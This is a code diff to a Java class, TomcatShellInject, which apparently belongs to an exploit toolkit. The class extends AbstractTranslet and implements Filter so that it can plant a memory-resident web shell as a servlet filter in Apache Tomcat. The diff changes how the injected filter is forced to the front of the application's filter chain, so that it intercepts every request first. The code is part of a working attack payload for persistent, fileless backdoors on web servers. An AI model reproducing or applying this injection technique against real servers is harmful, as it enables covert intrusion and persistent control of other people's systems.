@@ -13,6 +13,7 @@ import javax.servlet.FilterConfig;
 import javax.servlet.ServletException;
 import javax.servlet.ServletRequest;
 import javax.servlet.ServletResponse;
+import org.apache.tomcat.util.descriptor.web.FilterMap;
 
 /**
  * @author threedr3am
@@ -85,13 +86,18 @@ public class TomcatShellInject extends AbstractTranslet implements Filter {
                             //把filter插到第一位
                             org.apache.tomcat.util.descriptor.web.FilterMap[] filterMaps = standardContext
                                 .findFilterMaps();
+                            org.apache.tomcat.util.descriptor.web.FilterMap[] tmpFilterMaps = new FilterMap[filterMaps.length];
+                            int index = 1;
                             for (int i = 0; i < filterMaps.length; i++) {
                                 if (filterMaps[i].getFilterName().equalsIgnoreCase(filterName)) {
                                     org.apache.tomcat.util.descriptor.web.FilterMap filterMap = filterMaps[i];
-                                    filterMaps[i] = filterMaps[0];
-                                    filterMaps[0] = filterMap;
-                                    break;
+                                    tmpFilterMaps[0] = filterMap;
+                                } else {
+                                    tmpFilterMaps[index++] = filterMaps[i];
                                 }
+                            }
+                            for (int i = 0; i < filterMaps.length; i++) {
+                                filterMaps[i] = tmpFilterMaps[i];
                             }
                         }
                     }
